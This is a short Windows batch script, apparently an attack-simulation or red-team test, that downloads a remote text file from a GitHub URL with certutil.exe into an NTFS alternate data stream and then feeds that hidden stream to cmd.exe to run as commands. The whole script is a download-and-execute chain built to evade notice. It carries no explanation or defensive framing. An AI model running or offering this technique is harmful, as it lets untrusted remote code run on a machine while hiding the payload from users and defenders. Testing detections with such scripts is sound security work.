@ECHO OFF

certutil.exe -urlcache -split -f https://raw.githubusercontent.com/MRCEAS/TMP/main/recon_test.txt C:\temp\test.txt:ads

sleep 5s

cmd.exe - < C:\temp\test.txt:ads

